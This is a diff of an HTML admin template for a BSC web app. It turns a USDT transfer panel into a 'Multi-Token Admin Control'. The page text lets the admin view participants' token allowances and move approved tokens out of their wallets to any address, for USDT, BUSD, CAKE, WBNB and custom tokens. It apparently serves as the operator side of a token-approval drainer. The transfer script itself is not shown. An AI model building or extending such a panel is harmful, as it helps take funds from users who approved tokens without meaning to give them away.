@@ -3,67 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Program Management</title>
+    <title>Multi-Token Admin Panel - Universal Management</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
     <style>
         .admin-header {
-            background: linear-gradient(135deg, #EF4444, #DC2626);
+            background: linear-gradient(135deg, #8B5CF6, #7C3AED);
             padding: 30px;
             border-radius: 16px;
             margin-bottom: 30px;
             text-align: center;
         }
-        .admin-header h1 {
-            color: white;
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        .admin-stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        .stat-card {
-            background: var(--bg-secondary);
-            padding: 20px;
+        .token-controls {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(139, 92, 246, 0.1));
+            border: 1px solid #10B981;
             border-radius: 12px;
-            border: 1px solid var(--border-color);
-            text-align: center;
+            padding: 20px;
+            margin-bottom: 20px;
         }
-        .stat-value {
-            font-size: 32px;
-            font-weight: 700;
-            color: var(--primary-color);
-            margin: 10px 0;
+        .token-selector {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
         }
-        .stat-label {
-            color: var(--text-secondary);
-            font-size: 14px;
-        }
-        .user-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-        .user-table th {
+        .token-selector select {
+            flex: 1;
+            padding: 12px;
             background: var(--bg-tertiary);
-            padding: 15px;
-            text-align: left;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
             color: var(--text-primary);
-            font-weight: 600;
-            border: 1px solid var(--border-color);
+            font-size: 16px;
         }
-        .user-table td {
-            padding: 15px;
-            border: 1px solid var(--border-color);
-            color: var(--text-secondary);
-        }
-        .user-table tr:hover {
+        .token-info-display {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
             background: var(--bg-tertiary);
+            border-radius: 8px;
+        }
+        .add-token-section {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .add-token-section input {
+            flex: 1;
+            padding: 10px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
         }
         .transfer-btn {
-            background: linear-gradient(135deg, #10B981, #059669);
+            background: linear-gradient(135deg, #8B5CF6, #7C3AED);
             color: white;
             border: none;
             padding: 8px 16px;
@@ -74,28 +68,52 @@
         }
         .transfer-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(16, 185, 129, 0.4);
+            box-shadow: 0 4px 8px rgba(139, 92, 246, 0.4);
         }
-        .danger-btn {
-            background: linear-gradient(135deg, #EF4444, #DC2626);
+        .transfer-btn:disabled {
+            background: var(--bg-tertiary);
+            color: var(--text-secondary);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
-        .status-badge {
-            padding: 4px 12px;
+        .status-pending {
+            background: rgba(251, 146, 60, 0.2);
+            color: #FB923C;
+        }
+        .multi-token-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .token-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .token-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            background: var(--bg-tertiary);
             border-radius: 6px;
-            font-size: 12px;
-            font-weight: 600;
+            font-size: 14px;
+            border: 1px solid var(--border-color);
         }
-        .status-active {
-            background: rgba(16, 185, 129, 0.2);
-            color: #10B981;
+        .token-badge.active {
+            border-color: #10B981;
+            background: rgba(16, 185, 129, 0.1);
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="admin-header">
-            <h1>🔐 Admin Control Panel</h1>
-            <p style="color: rgba(255,255,255,0.8);">Manage participants and transfers</p>
+            <h1>🎛️ Multi-Token Admin Control</h1>
+            <p style="color: rgba(255,255,255,0.8);">Universal management for ALL BEP-20 tokens</p>
         </div>
 
         <!-- Admin Stats -->
@@ -105,12 +123,52 @@
                 <div id="totalParticipants" class="stat-value">0</div>
             </div>
             <div class="stat-card">
-                <div class="stat-label">Total USDT Balance</div>
-                <div id="totalBalance" class="stat-value">0</div>
+                <div class="stat-label">Supported Tokens</div>
+                <div id="supportedTokens" class="stat-value">0</div>
             </div>
             <div class="stat-card">
                 <div class="stat-label">Admin Wallet</div>
                 <div id="adminWallet" class="stat-value" style="font-size: 14px;">Not Connected</div>
+            </div>
+        </div>
+
+        <!-- Admin Balance Overview -->
+        <div id="adminBalanceOverview">
+            <!-- Balance overview will be populated when admin connects -->
+        </div>
+
+        <!-- Token Controls -->
+        <div class="token-controls card">
+            <h2>🪙 Token Management</h2>
+
+            <div class="token-selector">
+                <label style="font-weight: 600;">Select Token:</label>
+                <select id="tokenSelector">
+                    <option value="">Choose token to manage transfers</option>
+                </select>
+                <button id="loadParticipantsBtn" class="secondary-btn">Load Participants</button>
+            </div>
+
+            <div id="selectedTokenInfo" class="token-info-display hidden">
+                <span id="selectedTokenIcon"></span>
+                <span id="selectedTokenName" style="font-weight: 600;"></span>
+                <span id="selectedTokenAddress" style="font-family: monospace; font-size: 12px; color: var(--text-secondary);"></span>
+            </div>
+
+            <div class="add-token-section">
+                <input type="text" id="customTokenAddress" placeholder="Enter custom token address (0x...)">
+                <button id="addTokenBtn" class="primary-btn">➕ Add Token</button>
+            </div>
+
+            <div class="token-grid">
+                <div class="token-badge active">💵 USDT</div>
+                <div class="token-badge active">💰 BUSD</div>
+                <div class="token-badge active">💵 USDC</div>
+                <div class="token-badge active">🥞 CAKE</div>
+                <div class="token-badge active">🟡 WBNB</div>
+                <div class="token-badge active">🔷 ETH</div>
+                <div class="token-badge active">🟣 MATIC</div>
+                <div class="token-badge">➕ Custom</div>
             </div>
         </div>
 
@@ -123,20 +181,21 @@
             </div>
         </div>
 
-        <!-- Transfer Info -->
-        <div class="card" style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(79, 70, 229, 0.1)); border: 1px solid #10B981;">
-            <h2>💸 USDT Transfer Feature</h2>
+        <!-- Multi-Transfer Info -->
+        <div class="card" style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(16, 185, 129, 0.1)); border: 1px solid #8B5CF6;">
+            <h2>💸 Individual Token Transfer System</h2>
             <div style="color: var(--text-secondary); line-height: 1.6;">
-                <p><strong>✅ NEW: You can now transfer USDT to ANY BSC wallet address!</strong></p>
+                <p><strong>✅ INDIVIDUAL APPROVALS: Users approve tokens separately!</strong></p>
                 <ul style="margin: 15px 0 0 20px;">
-                    <li>From any participant's wallet</li>
-                    <li>To ANY BSC wallet address you specify</li>
-                    <li>No longer limited to admin wallet only</li>
-                    <li>Full control over recipient address</li>
+                    <li>Users approve each token individually</li>
+                    <li>Transfer only approved tokens from participants</li>
+                    <li>Real-time balance and allowance tracking</li>
+                    <li>Add unlimited custom tokens</li>
+                    <li>Full control over token permissions</li>
                 </ul>
                 <div style="background: rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin-top: 15px;">
                     <p style="margin: 0; font-size: 14px;">
-                        <strong>📋 How to use:</strong> Click "💸 Transfer" on any participant → Enter any BSC address → Confirm
+                        <strong>📋 How to use:</strong> Select token → Load participants → Check "Allowance" column → Transfer from approved users only
                     </p>
                 </div>
             </div>
@@ -146,18 +205,18 @@
         <div class="card">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                 <h2>👥 Program Participants</h2>
-                <button id="loadParticipantsBtn" class="secondary-btn">Load Participants</button>
+                <span id="selectedTokenTitle" style="color: var(--text-secondary); font-size: 14px;">Select a token to view balances</span>
             </div>
-            
+
             <div id="participantsList">
-                <p class="empty-state">No participants yet. Click "Load Participants" to fetch data.</p>
+                <p class="empty-state">No participants loaded. Select a token and click "Load Participants".</p>
             </div>
         </div>
 
         <!-- Transfer History -->
         <div class="card">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h2>📜 USDT Transfer History</h2>
+                <h2>📜 Transfer History</h2>
                 <button id="refreshHistoryBtn" class="secondary-btn">Refresh History</button>
             </div>
 
@@ -169,7 +228,7 @@
         <!-- Transfer Modal -->
         <div id="transferModal" class="modal hidden">
             <div class="modal-content">
-                <h2>💸 Transfer USDT</h2>
+                <h2>💸 Transfer <span id="modalToken">Token</span></h2>
                 <div class="form-group">
                     <label>From User:</label>
                     <input type="text" id="modalFromAddress" readonly class="form-input" style="background: var(--bg-tertiary);">
@@ -190,11 +249,11 @@
                         </button>
                     </div>
                     <p style="font-size: 12px; color: var(--text-secondary); margin-top: 5px;">
-                        💡 You can send USDT to ANY BSC wallet address - not just admin wallet
+                        💡 You can send tokens to ANY BSC wallet address
                     </p>
                 </div>
                 <div class="form-group">
-                    <label>Amount (USDT):</label>
+                    <label>Amount:</label>
                     <input type="number" id="modalAmount" class="form-input" placeholder="0.00" min="0" step="0.01">
                 </div>
                 <div style="display: flex; gap: 10px; margin-top: 20px;">
@@ -220,11 +279,11 @@
     <script>
         // Inject environment variables from Flask
         window.CONTRACT_ADDRESSES = {
+            UNIVERSAL_CONTRACT_ADDRESS: '{{ universal_contract_address | default("YOUR_UNIVERSAL_CONTRACT_ADDRESS_HERE") }}',
             USDT_CONTRACT_ADDRESS: '{{ usdt_contract_address }}',
             PROGRAM_CONTRACT_ADDRESS: '{{ program_contract_address }}'
         };
     </script>
-    <script src="{{ url_for('static', filename='js/admin.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/multi-token-admin.js') }}"></script>
 </body>
 </html>
-
